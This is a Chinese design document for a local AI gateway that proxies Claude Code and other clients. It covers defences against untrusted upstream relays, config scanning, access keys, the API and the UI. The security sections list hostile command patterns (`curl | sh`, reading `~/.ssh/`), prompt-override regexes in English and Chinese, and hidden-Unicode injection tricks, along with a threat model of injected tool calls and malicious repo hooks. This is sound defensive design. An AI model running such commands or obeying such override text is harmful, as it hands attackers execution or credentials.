不做整块缓冲。它的代价（响应卡顿，而且恰恰卡在最重要的工具调用上）明确，收益却几乎为零——因为尽力阻断已经达到了同样的安全效果。

#### 处置策略按 provider 的信任级别走：

```yaml
providers:
  - name: anthropic-official
    trust: official        # 只记录，不拦
  - name: relay-cn
    trust: untrusted       # 高危拦截，中危告警
```

**高危拦截的含义**：中断响应流，向客户端返回一个错误事件，同时弹系统通知说明拦了什么、来自哪个上游。宁可让这一轮失败，也不能让它执行。

#### 一个体验上的关键点

我们改不了 Claude Code 自己的批准界面。但我们能做一件更有效的事：**在客户端弹出批准提示的同一瞬间，我们弹一个系统通知。**

> ⚠️ relay-cn 返回了一个包含 `curl | sh` 的 bash 调用
> 这个上游标记为不受信任。建议拒绝。

用户看到批准提示的同时看到这条，判断质量完全不一样。这是网关位置独有的能力——只有我们同时知道「这个调用长什么样」和「它来自哪个上游」。

#### 实现时补上的四条

**一、命中那一帧之前的内容照常发。**文档原来写的是「先转发再判断」，实现时改成了「先判断再转发」—— 客户端拿到的残片更短，而且一样简单。但**只掐掉命中的那一帧**：模型在动手之前通常先说了几句正常的话，一起吞掉的话，用户看到的是「什么都没发生然后报错了」，而不是「它说到一半被拦下了」。

算这个偏移的时候写错过一次：漏了减掉上一块的残留，于是「这一块既补完上一帧、又装着命中帧」时会把命中帧的前半段也发出去。补了测试盯着。

**二、没收齐的那一帧也要扫。**否则攻击者只要让危险片段停在帧边界上，「等收齐再看」就永远看不到它。

**三、分级的判据是「能不能一步拿到执行权或者拿走凭据」，不是「听起来多可怕」。**`rm -rf` 很吓人，但它毁的是你自己的文件，不会把机器交给别人 —— 所以它是中危。`curl | sh`、往 `.zshrc` 写东西、读 `~/.ssh/` 是高危。

**四、规则里的长度上限可能就是个洞。**`curl-pipe-sh` 原来写成 `(curl|wget)[^\n|]{0,200}\|\s*sh`，而把 URL 填长到 200 字符以上就绕过去了。那个上限本来是防「跨行乱匹配」的，可 `[^\n|]` 已经保证了「同一行、中间没有别的管道」—— 上限除了留个洞什么都没做。**每一个 `{0,N}` 都要问一句：N 是在防什么，攻击者能不能直接迈过去。**

#### 提示注入检测的两个边界

正文里的注入**永远不切断**：它改变的是模型之后的行为，不是直接执行，而切断一条正常回答的代价，比让用户自己看一眼那段文字高得多。

而且**只对不受信任的上游查**。官方端点上，模型讲解提示注入是完全正常的（「『忽略以上所有指令』是最经典的开头」），对它开这一条等于天天误报 —— 而误报几次之后，真该看的那次也不会被看。

#### 防线二：交叉验证（评估过，不进 v1）

更强的检测是**把同一个请求也发一份给可信上游，对比两边是否都决定调用危险工具**。

但这有个根本困难：模型是非确定性的，两次调用本来就会不同，简单 diff 必然误报。能比的只是「是否都决定调用高危工具」这个二元决策，信号很弱。而且成本翻倍。

所以 v1 不做，写在这里是为了说明**我们评估过并且知道它为什么不够好**。真要做的话，触发条件应该极窄：只在「不受信任上游」且「响应含高危工具调用」时才触发验证，这样绝大多数请求不受影响。

#### 防线三：上游行为基线

我们有完整的请求历史，可以给每个 provider 建行为画像：工具调用率、高危模式出现率、响应长度分布。

某个中转站用了三个月一直正常，某天开始返回大量 bash 调用——这是统计异常，值得告警。这个能力不需要额外设计，是观测数据的自然衍生品，放 M3 之后。

#### 提示注入检测

中转站还可以往响应**文本**里注入指令，影响后续轮次（因为响应会进入下一轮的上下文）。检测响应正文里的注入模式，和 5.3 的规则集共用一套。

---

### 5.3 静态扫描：客户端配置面

前两道防线在数据面上。但对 AI 客户端来说，**最大的攻击面根本不经过网络**。

#### 攻击面清单，按危险度排序

| 目标 | 为什么危险 |
|---|---|
| **hooks** | `settings.json` 里的 hooks 直接执行 shell 命令，在工具调用前后触发。这是攻击面里唯一能**无需任何模型参与**就拿到执行权的 |
| **MCP server 配置** | `.mcp.json` 指定的是可执行程序和参数，等同于「运行这个二进制」 |
| **skills** | `SKILL.md` 的内容会被注入模型上下文，成为指令 |
| **slash commands** | `.claude/commands/*.md`，同上 |
| **subagent 定义** | `.claude/agents/*.md`，同上，且可能声明宽松的工具权限 |
| **项目指令** | `CLAUDE.md` / `AGENTS.md`，被自动读入上下文 |

§7.12 的集中清单和这一节是同一件事的两面：**扫描需要知道去哪儿找，而清单正是那份地址簿。** 两者共用目录发现和文件监听，不该分开实现。

一个典型的攻击路径：你 clone 了一个看起来正常的仓库，它带着 `.claude/settings.json`。客户端确实有信任提示，但**信任是一次性的、目录级的**——你点了信任之后，该目录下的这些文件后续被改动（比如你 `git pull` 了一次）不会重新提示。

所以持续监控是有价值的：**首次扫描 + 变更时 diff 扫描**。

#### 检测什么

**一、危险命令模式**——和 5.2 的工具调用防火墙共用规则集，一套规则两处用。

**二、提示注入模式**

```
ignore (all )?(previous|above|prior) instructions
disregard (the )?(system|above)
you are now (a|an)
新的指令[：:]
忽略(以上|之前|上面)(的)?(所有)?指令
<\|im_start\|>  等对话标记伪造
```

规则集要中英文都覆盖。这个列表会持续演进，所以规则放在可更新的 YAML 里，不硬编码。

**它住在 `config.yaml` 的 `security.scan_rules` 里，不是另一个文件**（§3.1：只有一份配置文件）。规则集是用户会去调的**策略**，不是数据 —— 住在 `config.yaml` 里还白捡了变更历史和一键回滚（§3.8），单独一个文件那两样都没有。

而且是**加法加停用，不是整份替换**：

```yaml
security:
  scan_rules:
    add:
      - id: 我们公司的内网域名
        pattern: 'corp\.internal'
        why: 内网域名不该出现在发出去的命令里
    disable: [chmod-777]
```

整份替换看起来更「干净」，但它有和 cc-switch 那个白名单一模一样的毛病（§7.11）：**用户复制一份内置规则、改两条之后，他那份就永远停在复制的那一刻了** —— 我们后来加的每一条新攻击模式都到不了他机器上，而他不会察觉。「现在到底哪些规则生效」这个问题应该由界面回答（「22 条生效，其中 1 条是你加的，停用了 1 条内置」），而不是靠逼用户抄一份。

用户写坏一条正则**只让那一条失效**，其余照常工作 —— 一个因为配置写错就整个不工作的安全功能等于没有。但失效必须**大声**说出来：一条静默失效的安全规则，比没有那条规则更糟，因为用户以为它在。

**三、隐藏内容——这一项最容易被忽略，也最阴险**

文本里可以藏人眼看不见但模型读得到的指令：

| 手法 | 码位 |
|---|---|
| 零宽字符 | `U+200B` ZWSP、`U+200C` ZWNJ、`U+200D` ZWJ、`U+FEFF` |
| Unicode 标签字符 | `U+E0000`–`U+E007F`。这些码位在几乎所有渲染器里完全不可见，但会进入模型的 token 流。业内叫 ASCII smuggling |
| 双向控制符 | `U+202A`–`U+202E`、`U+2066`–`U+2069`。可以让显示顺序和实际字节顺序不一致，即 Trojan Source 攻击 |
| 同形异义字 | 西里尔字母 `а` 冒充拉丁 `a`，用于伪装命令和域名 |
| 视觉隐藏 | HTML 注释、白色文字、超长空白后接内容 |

检测方式很直接：扫描非预期码位，任何出现在指令文件里的零宽字符和标签字符都应该报出来——**正常的技术文档不需要它们**。误报率极低，价值极高。

**四、权限声明过宽**

skill 或 subagent 的 frontmatter 声明了 `allowed-tools: ["*"]`，或者声明的能力和正文内容明显不符（一个「格式化 JSON」的 skill 却要求网络和 shell 权限）。

#### 扫描范围：M4 开工前定下来的那件事

§11 的 M4 明确要求「开工前先定一件事：要监听哪些目录」。定下来的是：

| | 扫不扫 |
|---|---|
| 用户级的那一小撮固定路径 | 扫。位置确定、数量有限，可以无条件全看一遍 |
| **用户显式添加的项目目录** | 扫 |
| 全盘搜 `.claude/` | **不扫** |

最后一条是硬约束，不是偷懒。项目级的 `.claude/` 散落全盘，无界的 FSEvents 监听既是性能问题，也和 §4.5「空闲时接近零」的目标直接冲突。而且一个用户 clone 过的仓库可能有几百个，其中绝大多数他这辈子都不会再打开——**为它们持续烧 CPU 换不到任何东西**。

「显式添加」这个词是这条约束的全部内容：我们不去找项目，只看用户指给我们的那些。

#### 实扫发现的两种形态

M4 对着一台真机扫了一遍（零误报），发现清单模型里少了两样东西：

**一、MCP server 有远端型。** `{"url": "https://mcp.feishu.cn/mcp"}` 这种，没有 `command` 也没有 `args`。它的风险和本机型**不是一回事**：本机型是「运行这个二进制」，远端型是「用到它的时候，相关上下文会发到那台服务器上」。

所以它单独报一条，但**级别是「提示」不是「高危」**——它多半是用户自己有意加的，喊高危就是狼来了。指向 `localhost` 的不报。

**二、`enabled = false`。** 关掉的照样列进清单（它还在配置里，一次编辑就能打开），但**规则不扫它**——对一个当前跑不起来的东西喊高危，同样是狼来了。

#### 监听的实现：过滤器不是优化，是必需品

**`~/.claude.json` 的父目录是 `$HOME`。**而监听要盯目录不盯文件（编辑器
保存是「写临时文件再 rename」，盯文件的监听第一次保存之后就永久失效，
而且不报错）——于是我们不可避免地盯上了全机器最忙的目录之一。

不过滤的话，别人写一次 `.zsh_history` 我们就重扫一遍几十个文件。所以
只认 `.md` / `.json` / `.toml` / `.yaml` / `.yml`，并且跳过我们自己写的
旁文件和备份（接管一次会写它们，让它触发一轮扫描的话，那一轮什么都发现
不了）。

**实测**（M4）：20 秒里往 home 写 400 次无关文件，core 的 CPU 时间从
`0:00.10` 到 `0:00.10`，一次都没被吵醒；往一个 skill 里塞一个零宽字符，
3 秒内报出来，整轮重扫花掉 20 毫秒。

还有一条：**目录不递归**。`~/.claude/` 底下有 `projects/`、`todos/`、
`shell-snapshots/` 这些每分钟都在变的东西，递归盯它等于给自己找一个
永不停歇的事件源。代价是 `skills/<名字>/SKILL.md` 这种一层深的要各自
加进监听集合——所以收的是**每个来源文件自己的父目录**，而不是几个根目录。

#### 首次扫描不算「新出现」

diff 扫描要回答的是「刚刚变了什么」，所以第一次扫出来的东西**不发告警**
——否则用户第一次打开就会被一屏「新发现」砸中，而那些东西可能在他机器上
放了半年。同一条发现消失后又出现，算一次新的；行号变了也算，因为那通常
意味着文件被编辑过。

记「上次看到什么」的时候**只记指纹，不记内容**：这些文件里有用户的提示词
和密钥，把它们的全文留在内存里没有任何必要。

#### 处置原则：只报告，不自动删除

这一条要写死。误报删掉用户的正常配置，比漏报还糟——它会摧毁信任，用户会立刻关掉整个功能。

发现问题时：UI 的 Security 页列出条目、风险等级、命中的具体行、以及一个可展开的 diff。托盘图标挂角标。高危项发系统通知。**删不删由用户点。**

对变更的处理要做得更细：不是重新扫全文，而是只扫 diff。一个用了半年的 skill 突然多了一段零宽字符，这个信号比「这个文件里有可疑内容」强得多。

---

### 5.4 本地访问控制

前面三道防线管的是「流量内容」，这一节管「谁能用这个网关」。

#### 网关必须有密钥

cc-switch 的本地代理不设密码，任何本机进程都能直接用它花你的钱，而且请求混在你自己的流量里事后分不清是谁发的。

**但要如实说清楚这个密钥能做什么、不能做什么。** 它最终会明文写进 `~/.claude/settings.json`（§7.11），所以同一个「任何本机进程」读一下文件就拿到了——**它不提供本机进程隔离**。

它真正的价值有两条，都很实在（完整的识别链路见 §3.3.1）：

| 价值 | 说明 |
|---|---|
| **客户端归属识别** | 每个客户端一把独立的密钥，`when: { client: claude-code }` 这类规则才有依据，请求历史里才分得清谁是谁 |
| **挡住「随手一发」** | 一个 `curl localhost:8788` 的脚本、一个探测本地端口的程序，不会误打误撞用上你的额度 |

**监听非 loopback 时它才真正变成安全边界**，那时局域网里的其他机器读不到你的 `settings.json`。而且那时 key 还同时承担预算、并发、有效期的绑定（§3.3.1）——**它从一个门禁变成了完整的策略载体**。

把它说成本机隔离是过头的，会让人产生错误的安全感。

| 项 | 设计 |
|---|---|
| 格式 | `tw-` 前缀（跟品牌走）+ 32 字节随机，base62 编码 |
| 熵 | 256 位。不用 UUID，那只有 122 位且结构可预测 |
| 存储 | 明文写在 `config.yaml` 的 `clients` 段（§3.2）。本来就要明文可读——它得原样写进客户端的配置文件 |
| 校验 | 常数时间比较。这一步很便宜，没有理由不做 |
| 多密钥 | 每个接管的客户端一把独立的，这样 `when: { client: claude-code }` 这类规则才有依据 |
| 轮换 | 一键轮换，并自动更新所有已接管客户端的配置文件。轮换后旧密钥保留一个可配的宽限期，避免正在跑的任务半路失败 |

UI 上给三个操作：一键生成、自定义填入、一键轮换。自定义填入是为了让你能沿用已有的密钥管理习惯。

#### 监听地址：学 Surge，但要联动

Surge 的监听设置是个下拉框，我们照抄这个交互，因为它把一个安全决策变成了一个显式的、看得见的选择。

```yaml
listen:
  gateway:
    bind: loopback      # loopback | lan | all | 具体 IP
    port: 8788
    allow_from: []      # 仅在 lan / all 时生效的来源白名单（CIDR）
```

| 选项 | 实际绑定 | 场景 |
|---|---|---|
| `loopback` | `127.0.0.1` | **默认。**只有本机能用 |
| `lan` | 自动探测到的私网地址，只绑那一个 | 手机、平板、另一台笔记本要用 |
| `all` | `0.0.0.0` | 明确知道自己在干什么 |
| 具体 IP | 你写什么绑什么 | 多网卡机器 |

**联动规则，这是重点**：

1. 一旦选了非 `loopback`，**密钥校验强制开启且不可关闭**。UI 上那个开关直接置灰并说明原因。
2. 选 `lan` 或 `all` 时，`allow_from` 默认填入 RFC1918 三个私网段。想放开得手动删，删的时候再警告一次。
3. 选 `all` 时额外提示：如果这台机器有公网 IP，你的网关现在暴露在互联网上。
4. UI 上实时显示**当前真正在监听的地址列表**，以及一个可复制的客户端配置片段。手机要用的话顺手给个二维码。

两个实现细节：macOS 上绑定非回环地址会触发防火墙授权弹窗，UI 要提前告知，不然用户会以为是程序卡住了；切换监听地址需要重建监听器，但不能打断正在进行的流——做法是新监听器先起来，老的停止接受新连接并等现有请求自然结束。

## 6. 控制面 API

默认经 **unix socket、不带 token**（§2.2 论证过为什么文件权限强于本机 token）。只有显式开启 TCP 通道时才要求 Bearer。

**TCP 模式下有两个端点要单独考虑**：`GET /config/raw` 和 `GET /config` 会返回明文密钥（§3.2）。远程访问时它们要么禁用，要么返回打码版本——默认选前者，想看配置就 ssh 过去看文件。

```
GET    /version               版本协商：应用 CalVer + 控制面 API 整数版本（§9.6）
                              ── 配置读写见 §3.8，那里有完整的一组 ──
GET    /config                结构化配置 + version
PATCH  /config                结构化 patch（带 base_version）
GET    /config/history        变更历史 + 回滚

GET    /providers             列表 + 健康 + 被动延迟分位数 + 今日用量
POST   /providers/:n/ping     ★ L1+L2：握手分段计时 + /v1/models，零成本
POST   /providers/:n/bench    ★ L3：真实请求测 TTFT，**要带 confirm 且返回实际花费**
GET    /providers/:n/bench/estimate   L3 的预估消耗，UI 弹确认框前先问这个

GET    /proxies               代理列表 + 健康 + 到各上游的延迟
POST   /proxies/:n/ping       L1：经该代理到指定上游的握手计时，零成本

GET    /models                推导出的模型全集 + 每个客户端实际能看到哪些（§3.9）
POST   /models/refresh        强制重新探测上游模型列表（默认缓存 24h）
POST   /models/preview        试算：某个客户端调 GET /v1/models 会拿到什么

GET    /groups                列表 + 当前选中 + 各成员状态
PUT    /groups/:n/select      手动切换

GET    /routes                路由规则 + 每条的命中/未命中计数与时间戳
POST   /routes/test           ★ 试算（见下）

GET    /requests?filter=...   历史查询，分页
GET    /requests/:id          单条完整详情（含 body）
POST   /requests/:id/replay   ★ 重放（换个 provider 再跑一次）
POST   /connections/:id/kill  掐掉进行中的流

GET    /stats?range=1h        聚合：tokens / cost / 延迟分位 / 缓存命中率
GET    /sessions              会话聚合列表

GET    /clients               本机检测到的 AI 客户端 + 接管状态
POST   /clients/:n/adopt      一键接管
POST   /clients/:n/restore    还原单个
POST   /clients/restore-all   全部还原（§7.15）
GET    /clients/restore-preview  还原前的 diff 预览，不落盘

WS     /events                ★ 统一事件流
```

两处细节抄自 mihomo，都是验证过好用的：

- 它的规则列表每条带 `{disabled, hitCount, hitAt, missCount, missAt}`。命中计数让规则页能显示「这条三天没匹配过」，是发现僵尸规则的唯一手段，这个照做。
- 它的流式端点**不另开 `/ws/` 路径**，而是在同一路径上按 `Upgrade: websocket` 做内容协商，普通 GET 返回一次性快照。这样 `curl /events` 能直接看一眼当前状态，不必开 WebSocket 客户端，对调试很友好。

### 6.1 `POST /routes/test` — 路由试算

从 Surge 的 rule test 学来的，但对 AI 场景更有必要，因为规则维度更抽象（token 数、是否带工具）——光看配置文件很难推演。

输入一个假想请求，字段名和 `when` 里的条件一一对应：

```json
{ "model": "claude-sonnet-4-5", "client": "claude-code",
  "input_tokens": 250000, "tools": true, "cache": true, "thinking": false }
```

返回完整决策链，包括**累积生效的 `set` 和 `guard`**（§3.4 的求值顺序）：

```json
{ "matched":  { "name": "超长上下文只有那家能吃" },
  "skipped":  [ { "name": "带缓存的必须走官方", "reason": "cache 命中但被前一条抢先" },
                { "name": "简单活儿本地跑", "reason": "input_tokens 250k 不满足 <4k" } ],
  "group":    "long-ctx-pool",
  "strategy": "fallback",
  "provider": "relay-1m",
  "upstream_model": "claude-sonnet-4.5-1m",
  "applied": {
    "set":   { },
    "guard": { "redact": ["api-keys", "private-keys"],
               "from":   "走中转的一律脱敏" }
  },
  "estimated_cost_usd": 0.7512 }
```

`skipped` 里给的是**人话理由**而不是「不匹配」三个字。`applied.guard.from` 指出这条安全策略是哪个规则加上去的——横切规则的效果不出现在 `matched` 里，不标出来用户会以为没生效。

UI 上把整个 routes 列表按命中、跳过、被抢先三种状态着色，配路由不用靠猜和试。

### 6.2 `WS /events` — 一条流承载所有实时数据

Clash 分了 `/traffic`、`/logs`、`/connections` 三条 WebSocket。我们合成一条：

```typescript
type Event =
  | { t: "req.start",      id, ts, client, model, path, est_input_tokens }
  | { t: "req.routed",     id, route_name, group, provider, upstream_model, attempt }
  | { t: "req.first_token",id, ttft_ms }
  | { t: "req.progress",   id, out_tokens }        // 节流，100ms 聚合一次
  | { t: "req.retry",      id, from_provider, reason, next_provider }
  | { t: "req.end",        id, status, usage, cost_usd, duration_ms, estimated: bool }
  | { t: "provider.health",name, state, latency_ms }
  | { t: "config.reloaded",version }
  | { t: "log",            level, msg }
```

理由：请求事件、日志、健康变化天然有因果和时序关系，一条流保证顺序；前端一个连接、一个 reducer，不需要在三条流之间对齐时间戳。

`req.progress` 必须节流。一个流式响应每秒几十个 chunk，十个并发就是几百条消息/秒，会把前端淹掉。按 100ms 窗口聚合。

---

## 7. UI 设计

Surge 的骨架，AI 的血肉。

```
● Dashboard     实时吞吐 · 今日成本 · 活跃流 · 缓存命中 · 安全卡片
◇ Requests      请求列表 —— 主战场
◈ Sessions      会话聚合 —— 差异化功能
⬡ Providers     供应商 · 健康 · 用量 · 测延迟（免费）· 测模型（花钱）
◇ Proxies       出站代理 · 类型 · 到各上游的握手耗时 · 测延迟（免费）
⬢ Groups        策略组 · 手动切换 · 延迟排行
≡ Routes        路由规则编辑 + 试算（§6.1）
◐ Clients       本机客户端接管
⚒ Tools         MCP 与 skill 的清单 · 扫描 · 复制矩阵（§7.12）
⛨ Security      扫描发现 · 拦截记录 · 三道防线开关（§5）
◔ Budget        预算与用量趋势
⚙ Settings
```

十二个页面，但**它们的重要性差得很远**——投入怎么分配见 §7.2。

### 7.1 技术栈与语言

#### 前端栈

| 层 | 选型 | 理由 |
|---|---|---|
| 框架 | React 19 + TypeScript | 和企业版 `web/` 一致，组件和心智可复用 |
| 样式 | Tailwind v4 + shadcn/ui | 同上。shadcn 是复制到项目里的源码而非依赖，改起来没有阻力 |
| 表格 | TanStack Table + Virtual | Requests 页要撑几万行不掉帧，虚拟化是硬需求 |
| 数据 | TanStack Query | 控制面 API 的缓存与失效 |
| 图表 | **uPlot** | 不用 Recharts。流式数据下 uPlot 性能差一个数量级，而 Dashboard 是每秒更新的 |
| 编辑器 | Monaco | 配置的文本模式（§3.8） |

#### 中英双语，跟随系统

**首次启动按系统语言决定**：系统首选语言是中文（`zh-*`）就用中文，其余一律英文。之后用户在设置里改过就以他的选择为准，存进 `config.yaml`。

这个规则简单到不需要「自动检测」的开关——**只有两种语言**，猜错的成本是用户点一下改回来。

实现上复用企业版 `web/src/i18n/` 那套 i18next 配置和 en/zh 两份词典。企业版有一条约束值得一起继承：**两份词典的 key 必须完全对齐**，CI 里跑一个 `check:i18n` 挡住漏翻。另外注意企业版有些 key 是通过模板字符串动态引用的，静态扫描会误判成未使用——那套检查脚本可以直接搬。

**做双语的代价要认**：每次加一句文案都要写两遍，UI 迭代会慢一点。接受这个代价的理由是——事后补 i18n 比一开始就抽贵得多，而这个项目大概率是要开源的。

**core 侧不做 i18n。** 错误信息、日志、CLI 输出一律英文。理由是它们会被复制进 issue、被搜索引擎索引、被别的工具解析；面向人的翻译发生在 UI 层，`tw-api` 返回的是稳定的错误码（§4.6.1）而不是译文。

### 7.2 两种使用模式，投入要严重倾斜

这个产品的 UI 有两种完全不同的使用模式：

| | 日常 | 排查与配置 |
|---|---|---|
| 频率 | 每天几十次 | 每周几次 |
| 界面 | **只看菜单栏**，偶尔点开托盘 | 打开主窗口 |
| 想知道 | 现在正常吗、今天花了多少 | 这个请求为什么慢、为什么走了那家 |

十个页面里，**Requests 和 Dashboard 承担九成的窗口使用时间**。其余都是「配一次就不常回来」的。

所以设计投入要按这个分级，而不是每个页面都做得一样重：

| 级别 | 页面 | 投入 |
|---|---|---|
| **主战场** | Requests | 反复打磨，虚拟滚动、详情抽屉、筛选、键盘操作都要做到位 |
| **第二眼** | Dashboard、Sessions | 认真做，但克制 |
| **配一次就走** | Providers、Proxies、Groups、Routes、Clients | **清楚可用即可**，用统一模式，不要发明交互 |
| **偶尔看** | Security、Budget、Tools | 同上 |
| **几乎不开** | Settings | 能用就行 |

**最容易犯的错是把力气平摊。** 十个页面每个都做得精致，结果是主战场不够好而配置页过度设计。

### 7.3 实时数据管线：不能每条事件都触发重渲染

这是 UI 侧唯一的真技术难点，值得先说。

**问题的规模**：一个流式请求每秒产生几十个 chunk 事件（§6.2 已经按 100ms 聚合过一轮），十个并发就是每秒几百条。如果每条都 `setState`，React 会被打死——不是慢，是完全卡住。

**分层解决**：

```
WS 事件流
   ↓
① 内存 ring buffer（useRef 持有，不进 React state）
   ↓
② 按帧聚合：requestAnimationFrame 里批量 flush
   ↓
③ 虚拟滚动只渲染可见的二十来行
```

四个关键决定：

**一、事件不直接进 state。** 先落到一个 `useRef` 持有的缓冲区。这一步是分水岭——进了 state 就意味着一次渲染。

**二、按帧 flush，不是按事件。** 一帧最多刷新一次，天然把几百条事件压成 60 次以内的更新。

**三、进行中的请求单独放一个 map，完成后才进列表。** 否则一行在它存活期间要被更新几十次，而虚拟列表的 diff 成本会随可见行数放大。进行中的那几条单独渲染在列表顶部，反而更符合直觉——正在跑的东西本来就该显眼。

**四、图表不走 React。** uPlot 直接操作 canvas，喂数据不重建组件。Dashboard 的实时曲线如果走 React 渲染，每秒重渲染整个图表组件会明显掉帧——这也是 §7.1 选 uPlot 而不是 Recharts 的原因。

**窗口不可见时停掉订阅。** §7.4 说了菜单栏空闲时跳过渲染，主窗口同理：隐藏之后直接断开 WS，重新打开时补拉最近的历史。这和 §2.4 那个「关窗后是隐藏还是销毁 webview」的权衡是配套的——**无论选哪个，都不该在用户看不见的时候烧 CPU**。

### 7.4 菜单栏：余光扫得到的那 50 像素

这类工具用户九成时间不开主窗口。所以菜单栏那一小块常驻显示，才是它每天真正被看到的界面。

Surge 在那里放上下行速率。对我们，问题是：**什么指标值得占那 50 像素？**

Surge 显示流量，因为流量就是网络代理的核心指标。对一个 AI 网关，**钱才是**。

#### 默认显示

```
┌──────────┐
│  $3.42   │   ← 今日花费
│  47 t/s  │   ← 输出速率
└──────────┘
```

选这两个的理由：花费是这个工具最独特的价值，没有别的东西能随时告诉你这个数；输出速率则让你知道「它在动」，和 Surge 的速率显示是同一个作用。

#### 可选指标

两行各自可配，从这些里选：

| 指标 | 样式 | 说明 |
|---|---|---|
| 今日花费 | `$3.42` | 默认第一行 |
| 输出速率 | `47 t/s` | 默认第二行 |
| 输入速率 | `↑2.1k` | 脉冲式，一个长上下文请求会瞬间冲高——这本身就是有用的信号 |
| 活跃流 | `3 ▶` | 并发数 |
| 今日 token | `1.2M` | 累计量 |
| 缓存命中 | `73%` | 长会话时最该盯的 |
| 当前上游 | `official` | 哪家在服务 |
| 最近 TTFT | `840ms` | 体感延迟 |

也允许只显示一行，或者纯图标不显示数字——菜单栏拥挤的机器上这个选项很有用。

#### 状态编码比数字更重要

菜单栏是**余光扫**的，颜色和形状的变化比读数字快一个量级。所以：

| 状态 | 表现 |
|---|---|
| **启动中** | 图标变淡，数字位显示 `—`。**开机自启时第一时间就要出现这个状态**（§2.4），不能等 core 就绪 |
| 正常 | 单色，跟随菜单栏亮暗 |
| 有活跃流 | 数字旁一个小圆点 |
| **安全拦截**（§5.2） | **变橙或红** |
| core 断开 | 变灰加感叹号 |

**安全拦截时菜单栏变色，是 §5 那套防线真正落地的地方。** 拦截发生的那一刻你可能正埋头在别的窗口里，系统通知一闪而过很容易错过，但菜单栏一直在那儿。这一条比通知本身更重要。

#### 实现路径（已查证 Tauri 2 API）

Tauri 2 的托盘接口有两个相关方法：

```rust
tray.set_title(Some("…"))        // 单行文本，macOS 上显示在图标旁
tray.set_icon(Some(image))       // 图片
Image::new_owned(rgba: Vec<u8>, width: u32, height: u32)   // 无需 feature flag
```

关键结论：**两行显示必须自己渲染成图片。** 菜单栏只有 22pt 高，`set_title` 那一行文本放不下两行，Surge 那个效果是渲染出来的。

所以做法是：每秒渲染一张约 48×22 逻辑像素（Retina 下 96×44）的 RGBA 位图，两行文字，`set_icon` 推上去。`Image::new_owned` 接受运行时构造的 RGBA buffer 且不需要额外 feature，这条路是通的。

#### 三个实现坑

**一、宽度抖动。** 花费从 `$9.99` 变成 `$10.02`，位数一变，菜单栏里它右边的所有图标都会跟着左右跳，非常烦人。解决：画布固定宽度，按最大可能内容预留，数字右对齐并用等宽字形。

**二、亮暗适配和彩色告警冲突。** `set_icon_as_template(true)` 能让 macOS 用 alpha 通道自动反色，完美适配亮暗菜单栏——但**模板图只能是单色**，没法表达告警红。

折中：正常状态用模板图，享受自动适配；告警状态关掉模板标志，自己读系统外观渲染彩色。状态切换时一并切 `set_icon_as_template`。

**三、刘海机型的空间。** 菜单栏图标多了会被直接隐藏，用户根本看不见。宽度要克制，并提供「空闲时只显示图标」的选项。

#### 更新频率

一秒一次，再快没有信息增益只是耗电。**空闲时跳过渲染**——没有活跃请求、花费也没变的时候，不做无谓的重绘。这直接关系到 §4.5 那条「空闲 CPU 约等于零」的指标。

### 7.5 点开之后：托盘菜单

菜单栏显示的是状态，点开才是操作面板。

```
ThinkWatch  ● 运行中
─────────────────────
今日  $3.42 · 1.2M tokens
缓存命中  73%
─────────────────────
sonnet-pool  ▸  ● anthropic-official
                  relay-cn  (128ms)
cheap-pool   ▸  ● ollama
─────────────────────
最近变更  ▸  撤销上一次修改
─────────────────────
打开主窗口
退出
```

> **「暂停代理」拿掉了**（2026-09-11）。三种读法各有硬伤：
>
> - **只关端口** —— 客户端指着的端口没人听了，connection refused，所有
>   AI 客户端立刻全坏。那不是暂停，是断电。
> - **关端口 + 恢复客户端配置** —— 那就是已经做好的「全部还原」（§7.15），
>   而且对 `takes_effect: on_restart` 那几个客户端不是立刻生效，
>   **而「暂停」这个词会让人以为是立刻的**。
> - **端口照听、跳过所有加工直发默认上游** —— 这个语义是干净的，但
>   「全部还原」已经覆盖了「我不想让流量经过它」这个真实需求。
>
> 一个说不清自己是什么意思的开关，比没有这个开关危险。

从托盘直接切策略组，不用开窗口——这就把 cc-switch 的全部使用场景收编了，而且不用重启客户端。

**「退出」是这个菜单里唯一会真正结束进程的入口**（§2.4）。点窗口红叉和按 ⌘Q 都只隐藏窗口，因为退出的代价是所有 AI 客户端立刻失联，不该由一次手滑造成。所以这一项要和上面的操作在视觉上分开，并且加确认。

> **托盘菜单按这一节重建了**（2026-09-11）。之前只有「打开主界面」和
> 「退出」两项 —— 状态行、组切换、撤销全都没有。
>
> 现在：状态行（运行中 / 今日花费，**订阅账号显示额度而不是金额** ——
> 「今天花了 $0.00」对他是句废话）、每个 `select` 组一个子菜单（选中的
> 打勾，这是 §3.5「托盘里切」的那一半）、撤销上一次配置修改、打开主界面、
> 退出。
>
> 四个小决定：
>
> - **状态行是点不动的**。它是状态不是操作。
> - **没得撤的时候「撤销」是灰的，不是不显示。**一个时有时无的菜单项，
>   用户每次都要重新找它在哪儿。
> - **只在内容真的变了的时候重建菜单。**每秒重建一次是浪费，而且 macOS
>   上菜单正开着时重建会把它收起来 —— 用户点到一半菜单没了。
> - **退出的确认在窗口里，不在托盘里。**托盘弹不了对话框，所以那一项
>   先把窗口拉起来，真正的 `exit` 在用户点过「退出」之后才发生。确认
>   框里还要说一句「只是想关窗口的话点红叉就行」—— 大部分人按到这里
>   其实只是想收起界面。
>
> 数据**在循环里收，不在菜单事件里收** —— 后者会让用户点开菜单那一下
> 等一次控制面往返，而菜单是要立刻弹出来的东西。
>
> 但**收数据本身要限频**：菜单要的东西（策略组、历史）得走两次控制面
> 往返，一秒两次是在为一个几分钟才变一次的菜单持续付钱，而这个应用的
> 第一条约束就是空闲时约等于不存在（§7.4）。五秒一次 —— 改完配置最多
> 等五秒菜单跟上。实测 core 侧空闲 45 秒 CPU 时间没动（0:00.07）。

「撤销上一次修改」挂在托盘上是有道理的：既然只有一份配置文件、所有改动都直接生效（§3.1），那随手撤销就得和随手修改一样方便。这是单文件模型能成立的配套。多 profile 排在 M6+，v1 不做。

### 7.6 首次运行：从零到第一个请求

这一段初稿完全没有，而它决定了产品的第一印象。有个具体的坑：**空配置是非法的**——§3.8 的语义校验要求兜底 route 必须存在且只有一条，所以「没有配置文件」和「有一个空配置文件」都过不了校验。必须有初始生成逻辑。

闭环是五步，全程不该超过三分钟：

| 步 | 做什么 | 关键点 |
|---|---|---|
| 1 | **生成最小合法配置** | 含一把自动生成的网关密钥、一条兜底 route、`0600` 权限。整文件生成，不走 §3.8 的最小替换（那是两套机制） |
| 2 | **引导填第一个 provider** | 只问三样：名字、base_url、key。协议能从 URL 猜就猜（`api.anthropic.com` → anthropic） |
